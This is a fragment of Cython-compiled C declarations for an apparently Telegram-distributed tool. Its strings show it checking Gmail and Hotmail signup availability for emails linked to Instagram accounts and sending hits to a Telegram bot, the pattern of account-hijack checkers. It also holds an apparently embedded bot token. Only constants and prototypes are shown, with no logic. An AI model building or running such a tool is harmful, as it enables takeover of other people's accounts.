static const char __pyx_k_application_x_www_form_urlencode_2[] = "application/x-www-form-urlencoded; charset=UTF-8";
static const char __pyx_k_enablejspublickeydeprecationexpe_2[] = "enablejspublickeydeprecationexperiment_control";
static const char __pyx_k_enablejspublickeydeprecationexpe_3[] = "enablejspublickeydeprecationexperiment_treatment";
static const char __pyx_k_https_accounts_google_com___sign_2[] = "https://accounts.google.com/_/signup/usernameavailability";
static const char __pyx_k_https_accounts_google_com_signup_2[] = "https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL=";
static const char __pyx_k_https_signup_live_com_signup_lic_2[] = "https://signup.live.com/signup?lic=1&uaid=f26d1e8726944e3f9cc96aafdfdf8225";
static PyObject *__pyx_kp_u_;
static PyObject *__pyx_kp_u_0;
static PyObject *__pyx_kp_u_0_0_null_null_web_glif_signup_0;
static PyObject *__pyx_kp_u_0_2;
static PyObject *__pyx_kp_u_0_91m_0_93m_0_92m_1_97m_1_41m_0;
static PyObject *__pyx_kp_u_0_91m_0_93m_0_92m_1_97m_1_41m_0_2;
static PyObject *__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240;
static PyObject *__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240_2;
static PyObject *__pyx_kp_u_0m;
static PyObject *__pyx_kp_u_1;
static PyObject *__pyx_kp_u_1700251574_982;
static PyObject *__pyx_kp_u_1_000;
static PyObject *__pyx_kp_u_1_30m;
static PyObject *__pyx_kp_u_1_31m;
static PyObject *__pyx_kp_u_1_32m;
static PyObject *__pyx_kp_u_1_32m_2;
static PyObject *__pyx_kp_u_1_32m_THIS_FILE_IS_EXPIRED_Chec;
static PyObject *__pyx_kp_u_1_33m;
static PyObject *__pyx_kp_u_1_34m;
static PyObject *__pyx_kp_u_1_35m;
static PyObject *__pyx_kp_u_1_36m;
static PyObject *__pyx_kp_u_1_37m;
static PyObject *__pyx_kp_u_1_91m;
static PyObject *__pyx_kp_u_1_95m;
static PyObject *__pyx_kp_u_1_96m;
static PyObject *__pyx_kp_u_1_97m;
static PyObject *__pyx_kp_u_1kbps;
static PyObject *__pyx_kp_u_1m_31m;
static PyObject *__pyx_kp_u_1m_32m;
static PyObject *__pyx_kp_u_1m_33m;
static PyObject *__pyx_kp_u_1m_34m;
static PyObject *__pyx_kp_u_1m_35m;
static PyObject *__pyx_kp_u_1m_36m;
static PyObject *__pyx_kp_u_1m_37m;
static PyObject *__pyx_kp_u_1m_38_5_208m;
static PyObject *__pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516;
static PyObject *__pyx_kp_u_22_2C_22;
static PyObject *__pyx_kp_u_25618261841150840;
static PyObject *__pyx_kp_u_2_31m;
static PyObject *__pyx_kp_u_2_32m;
static PyObject *__pyx_kp_u_2_34m;
static PyObject *__pyx_kp_u_2_35m;
static PyObject *__pyx_kp_u_2_36m;
static PyObject *__pyx_kp_u_2_39m;
static PyObject *__pyx_kp_u_356;
static PyObject *__pyx_kp_u_38_5;
static PyObject *__pyx_kp_u_38_5_202m;
static PyObject *__pyx_kp_u_38_5_203m;
static PyObject *__pyx_kp_u_38_5_208m;
static PyObject *__pyx_kp_u_3brTvw;
static PyObject *__pyx_kp_u_4;
static PyObject *__pyx_kp_u_50cc6861_7036_43b4_802e_fb428279;
static PyObject *__pyx_kp_u_567067343352427;
static PyObject *__pyx_kp_u_7311958747;
static PyObject *__pyx_kp_u_7765081594_AAGRwFlHwEjVQRmtS45vK;
static PyObject *__pyx_kp_u_9y3N5kLqzialQA7z96AMiyAKLMBWpqVj;
static PyObject *__pyx_n_s_A;
static PyObject *__pyx_kp_u_A_P_Is_Sss;
static PyObject *__pyx_kp_u_Accept_Encoding;
static PyObject *__pyx_kp_u_Accept_Language;
static PyObject *__pyx_n_s_B;
static PyObject *__pyx_n_s_B6;
static PyObject *__pyx_kp_u_B_P_Ts7;
static PyObject *__pyx_n_s_BaseException;
static PyObject *__pyx_n_s_Bl;
static PyObject *__pyx_n_s_C;
static PyObject *__pyx_n_u_Connection;
static PyObject *__pyx_n_s_Console;
static PyObject *__pyx_kp_u_Content_Length;
static PyObject *__pyx_kp_u_Content_Type;
static PyObject *__pyx_n_u_Cookie;
static PyObject *__pyx_n_s_DEM;
static PyObject *__pyx_n_s_DEM___init;
static PyObject *__pyx_n_s_DP6;
static PyObject *__pyx_n_s_DY6;
static PyObject *__pyx_n_s_E;
static PyObject *__pyx_kp_u_Error_Could_not_retrieve_bot_inf;
static PyObject *__pyx_kp_u_Error_Could_not_retrieve_user_in;
static PyObject *__pyx_n_s_F;
static PyObject *__pyx_n_s_G;
static PyObject *__pyx_n_s_G6;
static PyObject *__pyx_n_s_H;
static PyObject *__pyx_n_s_HH;
static PyObject *__pyx_kp_u_HIS_ID;
static PyObject *__pyx_n_u_Host;
static PyObject *__pyx_kp_u_Host_GAPS;
static PyObject *__pyx_n_s_I;
static PyObject *__pyx_n_s_ID;
static PyObject *__pyx_kp_u_IOS_LINK_tg_user_id;
static PyObject *__pyx_kp_u_I_T_F_Gs_S_O_Ts_S_T_T_A_M_O_A_O;
static PyObject *__pyx_n_s_Id;
static PyObject *__pyx_n_s_ImportError;
static PyObject *__pyx_n_s_InfoAcc;
static PyObject *__pyx_kp_u_Instagram_100_0_0_17_129_Android;
static PyObject *__pyx_n_s_J;
static PyObject *__pyx_n_s_L;
static PyObject *__pyx_n_s_L6;
static PyObject *__pyx_n_u_Liger;
static PyObject *__pyx_n_s_M;
static PyObject *__pyx_kp_u_Mozilla_5_0_Linux_Android_10_K_A;
static PyObject *__pyx_n_s_N;
static PyObject *__pyx_kp_u_No_first_name_available;
static PyObject *__pyx_kp_u_None;
static PyObject *__pyx_kp_u_Not_A_Brand_v_99_Google_Chrome;
static PyObject *__pyx_n_s_O;
static PyObject *__pyx_n_s_O6;
static PyObject *__pyx_n_s_P;
static PyObject *__pyx_n_s_P6;
static PyObject *__pyx_n_u_PROFILE;
static PyObject *__pyx_kp_u_P_A_Is;
static PyObject *__pyx_kp_u_P_Is_N_Is_S_Ps_W;
static PyObject *__pyx_kp_u_Ps_W_W_C_Y_PP;
static PyObject *__pyx_n_s_R;
static PyObject *__pyx_n_s_S;
static PyObject *__pyx_n_s_Session;
static PyObject *__pyx_n_s_Snuff;
static PyObject *__pyx_n_s_Snuff73;
static PyObject *__pyx_n_u_TL;
static PyObject *__pyx_kp_u_TOKEN;
static PyObject *__pyx_n_s_Table;
static PyObject *__pyx_n_s_Thread;
static PyObject *__pyx_kp_u_User_Agent;
static PyObject *__pyx_kp_u_User_does_not_have_a_username_Do;
static PyObject *__pyx_n_s_W6;
static PyObject *__pyx_n_u_WIFI;
static PyObject *__pyx_kp_u_Windows;
static PyObject *__pyx_n_s_Wsnuff;
static PyObject *__pyx_n_s_X;
static PyObject *__pyx_kp_u_X_Bloks_Version_Id;
static PyObject *__pyx_kp_u_X_FB_HTTP_Engine;
static PyObject *__pyx_kp_u_X_FB_LSD;
static PyObject *__pyx_kp_u_X_IG_App_ID;
static PyObject *__pyx_kp_u_X_IG_Bandwidth_Speed_KBPS;
static PyObject *__pyx_kp_u_X_IG_Bandwidth_TotalBytes_B;
static PyObject *__pyx_kp_u_X_IG_Bandwidth_TotalTime_MS;
static PyObject *__pyx_kp_u_X_IG_Capabilities;
static PyObject *__pyx_kp_u_X_IG_Connection_Speed;
static PyObject *__pyx_kp_u_X_IG_Connection_Type;
static PyObject *__pyx_kp_u_X_Pigeon_Rawclienttime;
static PyObject *__pyx_kp_u_X_Pigeon_Session_Id;
static PyObject *__pyx_n_s_Y;
static PyObject *__pyx_n_s_Y6;
static PyObject *__pyx_n_s_Z;
static PyObject *__pyx_n_s_Z1;
static PyObject *__pyx_kp_u__106;
static PyObject *__pyx_kp_u__11;
static PyObject *__pyx_kp_u__14;
static PyObject *__pyx_kp_u__17;
static PyObject *__pyx_kp_u__2;
static PyObject *__pyx_kp_u__21;
static PyObject *__pyx_kp_u__22;
static PyObject *__pyx_kp_u__24;
static PyObject *__pyx_kp_u__25;
static PyObject *__pyx_kp_u__27;
static PyObject *__pyx_kp_u__29;
static PyObject *__pyx_kp_u__3;
static PyObject *__pyx_kp_u__31;
static PyObject *__pyx_kp_u__37;
static PyObject *__pyx_kp_u__4;
static PyObject *__pyx_kp_u__5;
static PyObject *__pyx_kp_u__52;
static PyObject *__pyx_kp_u__56;
static PyObject *__pyx_kp_u__57;
static PyObject *__pyx_kp_u__58;
static PyObject *__pyx_kp_u__59;
static PyObject *__pyx_kp_u__6;
static PyObject *__pyx_kp_u__60;
static PyObject *__pyx_kp_u__61;
static PyObject *__pyx_kp_u__62;
static PyObject *__pyx_kp_u__63;
static PyObject *__pyx_n_s__64;
static PyObject *__pyx_kp_u__69;
static PyObject *__pyx_kp_u__7;
static PyObject *__pyx_kp_u__70;
static PyObject *__pyx_kp_u__71;
static PyObject *__pyx_kp_u__72;
static PyObject *__pyx_kp_u__73;
static PyObject *__pyx_kp_u__74;
static PyObject *__pyx_kp_u__75;
static PyObject *__pyx_kp_u__76;
static PyObject *__pyx_kp_u__77;
static PyObject *__pyx_kp_u__78;
static PyObject *__pyx_kp_u__79;
static PyObject *__pyx_kp_u__8;
static PyObject *__pyx_kp_u__80;
static PyObject *__pyx_kp_u__81;
static PyObject *__pyx_kp_u__82;
static PyObject *__pyx_kp_u__83;
static PyObject *__pyx_kp_u__84;
static PyObject *__pyx_kp_u__87;
static PyObject *__pyx_kp_u__9;
static PyObject *__pyx_kp_u__93;
static PyObject *__pyx_n_s__94;
static PyObject *__pyx_n_s_a;
static PyObject *__pyx_n_u_a;
static PyObject *__pyx_kp_u_a_Python_Tools7_MrSnuff;
static PyObject *__pyx_n_s_aa;
static PyObject *__pyx_n_s_aca;
static PyObject *__pyx_n_u_accept;
static PyObject *__pyx_kp_u_accept_language;
static PyObject *__pyx_kp_u_accounts_google_com;
static PyObject *__pyx_n_u_adid;
static PyObject *__pyx_n_s_align;
static PyObject *__pyx_n_s_amsc;
static PyObject *__pyx_n_u_amsc;
static PyObject *__pyx_n_s_an;
static PyObject *__pyx_n_s_an2;
static PyObject *__pyx_kp_u_android;
static PyObject *__pyx_kp_u_apiCanary;
static PyObject *__pyx_n_u_apiCanary_2;
static PyObject *__pyx_kp_u_application_json;
static PyObject *__pyx_kp_u_application_json_text_plain;
static PyObject *__pyx_kp_u_application_x_www_form_urlencode;
static PyObject *__pyx_kp_u_application_x_www_form_urlencode_2;
static PyObject *__pyx_kp_u_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q;
static PyObject *__pyx_n_s_args;
static PyObject *__pyx_n_s_ascii_letters;
static PyObject *__pyx_n_u_authority;
static PyObject *__pyx_n_u_azertyuiopmlkjhgfdsqwxcvbn;
static PyObject *__pyx_n_s_bademail;
static PyObject *__pyx_n_s_badinsta;
static PyObject *__pyx_n_u_block;
static PyObject *__pyx_n_s_blue;
static PyObject *__pyx_n_u_c80c5fb30dfae9e273e4009f03b18280;
static PyObject *__pyx_n_s_canary;
static PyObject *__pyx_n_u_canary;
static PyObject *__pyx_n_s_cc;
static PyObject *__pyx_n_u_center;
static PyObject *__pyx_n_s_cfonts;
static PyObject *__pyx_n_u_cfonts;
static PyObject *__pyx_n_s_char;
static PyObject *__pyx_n_u_chat_id;
static PyObject *__pyx_n_s_check;
static PyObject *__pyx_n_s_check_call;
static PyObject *__pyx_n_s_check_gmail;
static PyObject *__pyx_n_s_choice;
static PyObject *__pyx_n_s_choices;
static PyObject *__pyx_n_s_clear;
static PyObject *__pyx_n_u_clear;
static PyObject *__pyx_n_u_clientExperiments;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_clock_emoji;
static PyObject *__pyx_n_s_close;
static PyObject *__pyx_kp_u_code;
static PyObject *__pyx_kp_u_code_a_href_https_instagram_com;
static PyObject *__pyx_kp_u_code_code;
static PyObject *__pyx_kp_u_code_code_2;
static PyObject *__pyx_n_s_colors;
static PyObject *__pyx_kp_u_content_type;
static PyObject *__pyx_kp_u_continue_https_3A_2F_2Fmail_goog;
static PyObject *__pyx_n_u_control;
static PyObject *__pyx_n_s_cookies;
static PyObject *__pyx_n_u_cors;
static PyObject *__pyx_n_s_csrf;
static PyObject *__pyx_n_u_csrftoken;
static PyObject *__pyx_n_u_csrftoken_2;
static PyObject *__pyx_n_s_cyan;
static PyObject *__pyx_n_u_cyan;
static PyObject *__pyx_n_s_data;
static PyObject *__pyx_n_u_data;
static PyObject *__pyx_kp_u_data_initial_setup_data_null_nul;
static PyObject *__pyx_n_s_date;
static PyObject *__pyx_n_s_datetime;
static PyObject *__pyx_n_s_datte;
static PyObject *__pyx_n_s_decode;
static PyObject *__pyx_n_s_dev;
static PyObject *__pyx_n_s_device_id;
static PyObject *__pyx_n_u_device_id;
static PyObject *__pyx_n_u_deviceinfo;
static PyObject *__pyx_n_s_digits;
static PyObject *__pyx_n_s_doc;
static PyObject *__pyx_n_u_doc_id;
static PyObject *__pyx_n_s_dumps;
static PyObject *__pyx_n_s_e;
static PyObject *__pyx_n_s_eizon;
static PyObject *__pyx_n_u_eizon;
static PyObject *__pyx_n_s_email;
static PyObject *__pyx_n_u_email;
static PyObject *__pyx_n_s_emails;
static PyObject *__pyx_n_u_empty;
static PyObject *__pyx_kp_u_en_GB_en_US;
static PyObject *__pyx_kp_u_en_US_en_q_0_9;
static PyObject *__pyx_n_u_enablejspublickeydeprecationexpe;
static PyObject *__pyx_n_u_enablejspublickeydeprecationexpe_2;
static PyObject *__pyx_n_u_enablejspublickeydeprecationexpe_3;
static PyObject *__pyx_n_s_encode;
static PyObject *__pyx_n_s_enter;
static PyObject *__pyx_n_s_executable;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_s_exit_2;
static PyObject *__pyx_n_s_f;
static PyObject *__pyx_kp_u_f_req;
static PyObject *__pyx_n_s_ff;
static PyObject *__pyx_n_s_first_name;
static PyObject *__pyx_n_u_first_name;
static PyObject *__pyx_n_s_flush;
static PyObject *__pyx_n_u_follower_count;
static PyObject *__pyx_n_u_following_count;
static PyObject *__pyx_n_s_font;
static PyObject *__pyx_n_s_fowg;
static PyObject *__pyx_n_s_fows;
static PyObject *__pyx_n_s_generate_user_agent;
static PyObject *__pyx_n_s_genexpr;
static PyObject *__pyx_n_s_get;
static PyObject *__pyx_kp_u_getChat;
static PyObject *__pyx_kp_u_getMe;
static PyObject *__pyx_n_s_get_bot_info;
static PyObject *__pyx_n_s_get_dict;
static PyObject *__pyx_n_s_get_user_info;
static PyObject *__pyx_kp_u_gf_uar_1;
static PyObject *__pyx_n_s_gg;
static PyObject *__pyx_n_s_ggb;
static PyObject *__pyx_kp_u_gmail_com;
static PyObject *__pyx_n_s_goodig;
static PyObject *__pyx_kp_u_google_accounts_xsrf;
static PyObject *__pyx_n_s_green;
static PyObject *__pyx_n_s_group;
static PyObject *__pyx_n_u_guid;
static PyObject *__pyx_kp_u_gzip_deflate;
static PyObject *__pyx_n_s_hashlib;
static PyObject *__pyx_n_u_hashlib;
static PyObject *__pyx_n_s_he3;
static PyObject *__pyx_n_s_headers;
static PyObject *__pyx_n_s_hexdigest;
static PyObject *__pyx_n_s_hits;
static PyObject *__pyx_n_s_host;
static PyObject *__pyx_n_s_hotmail;
static PyObject *__pyx_kp_u_hotmail_com;
static PyObject *__pyx_n_s_hour;
static PyObject *__pyx_n_s_hours;
static PyObject *__pyx_kp_u_https_accounts_google_com;
static PyObject *__pyx_kp_u_https_accounts_google_com___sign;
static PyObject *__pyx_kp_u_https_accounts_google_com___sign_2;
static PyObject *__pyx_kp_u_https_accounts_google_com_signin;
static PyObject *__pyx_kp_u_https_accounts_google_com_signup;
static PyObject *__pyx_kp_u_https_accounts_google_com_signup_2;
static PyObject *__pyx_kp_u_https_api_ig_storiesig_info_api;
static PyObject *__pyx_kp_u_https_api_telegram_org_bot;
static PyObject *__pyx_kp_u_https_i_instagram_com_api_v1_acc;
static PyObject *__pyx_kp_u_https_signup_live_com;
static PyObject *__pyx_kp_u_https_signup_live_com_API_CheckA;
static PyObject *__pyx_kp_u_https_signup_live_com_API_Evalua;
static PyObject *__pyx_kp_u_https_signup_live_com_signup;
static PyObject *__pyx_kp_u_https_signup_live_com_signup_lic;
static PyObject *__pyx_kp_u_https_signup_live_com_signup_lic_2;
static PyObject *__pyx_kp_u_https_storiesig_info;
static PyObject *__pyx_kp_u_https_storiesig_info_2;
static PyObject *__pyx_kp_u_https_t_me_Python_Tools7;
static PyObject *__pyx_kp_u_https_www_instagram_com_accounts;
static PyObject *__pyx_kp_u_https_www_instagram_com_api_grap;
static PyObject *__pyx_n_s_hy;
static PyObject *__pyx_n_s_i;
static PyObject *__pyx_kp_u_i_instagram_com;
static PyObject *__pyx_n_u_id;
static PyObject *__pyx_n_u_ig_sig_key_version;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_import_module;
static PyObject *__pyx_n_s_importlib;
static PyObject *__pyx_n_s_init;
static PyObject *__pyx_n_s_input;
static PyObject *__pyx_n_u_install;
static PyObject *__pyx_kp_u_isAvailable_true;
static PyObject *__pyx_n_s_json;
static PyObject *__pyx_n_s_json_data;
static PyObject *__pyx_n_s_k;
static PyObject *__pyx_kp_u_keep_alive;
static PyObject *__pyx_n_s_library;
static PyObject *__pyx_n_s_loading_animation;
static PyObject *__pyx_n_s_loading_chars;
static PyObject *__pyx_n_s_logo;
static PyObject *__pyx_n_u_lsd;
static PyObject *__pyx_kp_u_m;
static PyObject *__pyx_n_u_m_2;
static PyObject *__pyx_n_s_magenta;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_u_main;
static PyObject *__pyx_n_s_md5;
static PyObject *__pyx_n_u_media_count;
static PyObject *__pyx_n_s_memo;
static PyObject *__pyx_n_s_metaclass;
static PyObject *__pyx_kp_u_mid_ZVfGvgABAAGoQqa7AY3mgoYBV1nP;
static PyObject *__pyx_n_s_module;
static PyObject *__pyx_n_s_n1;
static PyObject *__pyx_n_s_n2;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_kp_u_no_REST;
static PyObject *__pyx_n_u_none;
static PyObject *__pyx_n_s_now;
static PyObject *__pyx_kp_u_null;
static PyObject *__pyx_kp_u_null_null_null_null_null_NL_nul;
static PyObject *__pyx_n_s_o;
static PyObject *__pyx_n_s_ok;
static PyObject *__pyx_n_u_ok;
static PyObject *__pyx_n_s_open;
static PyObject *__pyx_n_s_orange;
static PyObject *__pyx_n_u_origin;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_n_u_parallax;
static PyObject *__pyx_n_s_params;
static PyObject *__pyx_kp_u_parse_mode_HTML;
static PyObject *__pyx_n_u_pip;
static PyObject *__pyx_n_u_pk;
static PyObject *__pyx_n_s_post;
static PyObject *__pyx_n_s_pp;
static PyObject *__pyx_n_s_pppp;
static PyObject *__pyx_n_s_prepare;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_u_priority;
static PyObject *__pyx_n_s_qualname;
static PyObject *__pyx_n_u_query;
static PyObject *__pyx_n_s_r;
static PyObject *__pyx_n_u_r;
static PyObject *__pyx_n_s_randint;
static PyObject *__pyx_n_s_random;
static PyObject *__pyx_n_u_random;
static PyObject *__pyx_n_s_randrange;
static PyObject *__pyx_n_s_range;
static PyObject *__pyx_n_s_ranges;
static PyObject *__pyx_n_s_re;
static PyObject *__pyx_n_s_read;
static PyObject *__pyx_n_s_red;
static PyObject *__pyx_n_s_red6;
static PyObject *__pyx_n_u_referer;
static PyObject *__pyx_n_s_render;
static PyObject *__pyx_n_u_render_surface;
static PyObject *__pyx_n_s_requests;
static PyObject *__pyx_n_u_requests;
static PyObject *__pyx_n_s_res;
static PyObject *__pyx_n_s_res1;
static PyObject *__pyx_n_s_reset;
static PyObject *__pyx_n_s_response;
static PyObject *__pyx_n_s_rest;
static PyObject *__pyx_n_u_result;
static PyObject *__pyx_n_u_rich;
static PyObject *__pyx_n_s_rich_console;
static PyObject *__pyx_n_s_rich_table;
static PyObject *__pyx_n_s_ror;
static PyObject *__pyx_n_s_rr;
static PyObject *__pyx_n_s_rrr;
static PyObject *__pyx_kp_u_s;
static PyObject *__pyx_n_s_s6;
static PyObject *__pyx_kp_u_s_2;
static PyObject *__pyx_kp_u_s_3;
static PyObject *__pyx_kp_u_s_4;
static PyObject *__pyx_kp_u_s_s;
static PyObject *__pyx_kp_u_s_s_2;
static PyObject *__pyx_kp_u_s_s_3;
static PyObject *__pyx_kp_u_s_s_s;
static PyObject *__pyx_kp_u_s_ss;
static PyObject *__pyx_kp_u_same_site;
static PyObject *__pyx_n_s_search;
static PyObject *__pyx_kp_u_sec_ch_ua;
static PyObject *__pyx_kp_u_sec_ch_ua_mobile;
static PyObject *__pyx_kp_u_sec_ch_ua_platform;
static PyObject *__pyx_kp_u_sec_fetch_dest;
static PyObject *__pyx_kp_u_sec_fetch_mode;
static PyObject *__pyx_kp_u_sec_fetch_site;
static PyObject *__pyx_n_s_self;
static PyObject *__pyx_n_s_send;
static PyObject *__pyx_kp_u_sendMessage_chat_id;
static PyObject *__pyx_n_s_session;
static PyObject *__pyx_n_u_signInName;
static PyObject *__pyx_n_u_signed_body;
static PyObject *__pyx_kp_u_signup_live_com;
static PyObject *__pyx_n_s_sleep;
static PyObject *__pyx_n_s_sn73;
static PyObject *__pyx_n_s_source;
static PyObject *__pyx_kp_s_source_py;
static PyObject *__pyx_n_s_space;
static PyObject *__pyx_n_s_split;
static PyObject *__pyx_n_s_splitlines;
static PyObject *__pyx_n_s_ss66;
static PyObject *__pyx_n_s_start;
static PyObject *__pyx_n_s_status_code;
static PyObject *__pyx_n_s_stdout;
static PyObject *__pyx_n_s_string;
static PyObject *__pyx_n_s_subprocess;
static PyObject *__pyx_n_s_sys;
static PyObject *__pyx_n_s_system;
static PyObject *__pyx_n_s_target;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_text;
static PyObject *__pyx_kp_u_text_2;
static PyObject *__pyx_kp_u_text_This_User_Use_Your_Gmail_m;
static PyObject *__pyx_n_s_threading;
static PyObject *__pyx_n_u_threading;
static PyObject *__pyx_n_s_throw;
static PyObject *__pyx_n_s_time;
static PyObject *__pyx_n_s_tl;
static PyObject *__pyx_kp_u_tl_txt;
static PyObject *__pyx_n_s_tlg;
static PyObject *__pyx_n_s_tll;
static PyObject *__pyx_n_s_tll_locals_genexpr;
static PyObject *__pyx_n_s_today;
static PyObject *__pyx_n_s_tok;
static PyObject *__pyx_n_s_token;
static PyObject *__pyx_n_u_treatments;
static PyObject *__pyx_kp_u_txt;
static PyObject *__pyx_kp_u_u_1_i;
static PyObject *__pyx_n_s_ua;
static PyObject *__pyx_n_u_unicode_escape;
static PyObject *__pyx_n_s_upper;
static PyObject *__pyx_n_s_url;
static PyObject *__pyx_n_s_user;
static PyObject *__pyx_n_u_user;
static PyObject *__pyx_kp_u_user_agent;
static PyObject *__pyx_n_s_user_agent_2;
static PyObject *__pyx_n_u_user_agent_2;
static PyObject *__pyx_n_s_user_id;
static PyObject *__pyx_n_s_user_info;
static PyObject *__pyx_n_s_username;
static PyObject *__pyx_n_u_username;
static PyObject *__pyx_n_s_uui;
static PyObject *__pyx_n_s_uuid;
static PyObject *__pyx_n_u_uuid;
static PyObject *__pyx_n_s_uuid4;
static PyObject *__pyx_n_u_variables;
static PyObject *__pyx_n_u_w;
static PyObject *__pyx_n_s_webbrowser;
static PyObject *__pyx_n_u_webbrowser;
static PyObject *__pyx_n_s_white;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_n_s_year;
static PyObject *__pyx_n_s_yellow;
static PyObject *__pyx_n_u_yellow;
static PyObject *__pyx_n_s_yy;
static PyObject *__pyx_n_s_z;
static PyObject *__pyx_pf_6source_3DEM___init__(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self, PyObject *__pyx_v_z); /* proto */
static PyObject *__pyx_pf_6source_clear(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_2i(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_4loading_animation(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_6get_bot_info(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_token); /* proto */
static PyObject *__pyx_pf_6source_8get_user_info(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_token, PyObject *__pyx_v_user_id); /* proto */
static PyObject *__pyx_pf_6source_3tll_genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3tll_3genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3tll_6genexpr(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_10tll(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_12check_gmail(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email); /* proto */
static PyObject *__pyx_pf_6source_14hotmail(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email); /* proto */
static PyObject *__pyx_pf_6source_16check(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email); /* proto */
static PyObject *__pyx_pf_6source_18rest(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_user); /* proto */
static PyObject *__pyx_pf_6source_20date(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_hy); /* proto */
static PyObject *__pyx_pf_6source_22InfoAcc(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_username, PyObject *__pyx_v_gg); /* proto */
static PyObject *__pyx_pf_6source_24eizon(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_26pppp(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_tp_new_6source___pyx_scope_struct__genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_6source___pyx_scope_struct_1_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_tp_new_6source___pyx_scope_struct_2_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_float_0_1;
static PyObject *__pyx_float_0_00110;
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_1;
static PyObject *__pyx_int_2;
static PyObject *__pyx_int_3;
static PyObject *__pyx_int_4;
static PyObject *__pyx_int_6;
static PyObject *__pyx_int_9;
static PyObject *__pyx_int_15;
static PyObject *__pyx_int_16;
static PyObject *__pyx_int_30;
static PyObject *__pyx_int_32;
static PyObject *__pyx_int_100;
static PyObject *__pyx_int_200;
static PyObject *__pyx_int_300;
static PyObject *__pyx_int_2010;
static PyObject *__pyx_int_2011;
static PyObject *__pyx_int_2012;
static PyObject *__pyx_int_2013;
static PyObject *__pyx_int_2014;
static PyObject *__pyx_int_2015;
static PyObject *__pyx_int_2016;
static PyObject *__pyx_int_2017;
static PyObject *__pyx_int_2018;
static PyObject *__pyx_int_2019;
static PyObject *__pyx_int_2023;
static PyObject *__pyx_int_2025;
static PyObject *__pyx_int_1279000;
static PyObject *__pyx_int_17750000;
static PyObject *__pyx_int_279760000;
static PyObject *__pyx_int_900990000;
static PyObject *__pyx_int_1629010000;
static PyObject *__pyx_int_2500000000;
static PyObject *__pyx_int_3713668786;
static PyObject *__pyx_int_5699785217;
static PyObject *__pyx_int_8597939245;
static PyObject *__pyx_int_21254029834;
static PyObject *__pyx_slice__35;
static PyObject *__pyx_tuple__10;
static PyObject *__pyx_tuple__12;
static PyObject *__pyx_tuple__13;
static PyObject *__pyx_tuple__15;
static PyObject *__pyx_tuple__16;
static PyObject *__pyx_tuple__18;
static PyObject *__pyx_tuple__19;
static PyObject *__pyx_tuple__20;
static PyObject *__pyx_tuple__23;
static PyObject *__pyx_tuple__26;
static PyObject *__pyx_tuple__28;
static PyObject *__pyx_tuple__30;
static PyObject *__pyx_tuple__32;
static PyObject *__pyx_tuple__33;
static PyObject *__pyx_tuple__34;
static PyObject *__pyx_tuple__36;
static PyObject *__pyx_tuple__38;
static PyObject *__pyx_tuple__39;
static PyObject *__pyx_tuple__40;
static PyObject *__pyx_tuple__41;
static PyObject *__pyx_tuple__42;
static PyObject *__pyx_tuple__43;
static PyObject *__pyx_tuple__44;
static PyObject *__pyx_tuple__45;
static PyObject *__pyx_tuple__46;
static PyObject *__pyx_tuple__47;
static PyObject *__pyx_tuple__48;
static PyObject *__pyx_tuple__49;
static PyObject *__pyx_tuple__50;
static PyObject *__pyx_tuple__51;
static PyObject *__pyx_tuple__53;
static PyObject *__pyx_tuple__54;
static PyObject *__pyx_tuple__55;
static PyObject *__pyx_tuple__65;
static PyObject *__pyx_tuple__66;
static PyObject *__pyx_tuple__67;
static PyObject *__pyx_tuple__68;
static PyObject *__pyx_tuple__85;
static PyObject *__pyx_tuple__86;
static PyObject *__pyx_tuple__88;
static PyObject *__pyx_tuple__89;
static PyObject *__pyx_tuple__95;
static PyObject *__pyx_tuple__97;
static PyObject *__pyx_tuple__99;
static PyObject *__pyx_tuple__101;
static PyObject *__pyx_tuple__102;
static PyObject *__pyx_tuple__103;
static PyObject *__pyx_tuple__104;
static PyObject *__pyx_tuple__105;
static PyObject *__pyx_tuple__107;
static PyObject *__pyx_tuple__108;
static PyObject *__pyx_tuple__110;
static PyObject *__pyx_tuple__112;
static PyObject *__pyx_tuple__114;
static PyObject *__pyx_tuple__116;
static PyObject *__pyx_tuple__118;
static PyObject *__pyx_tuple__120;
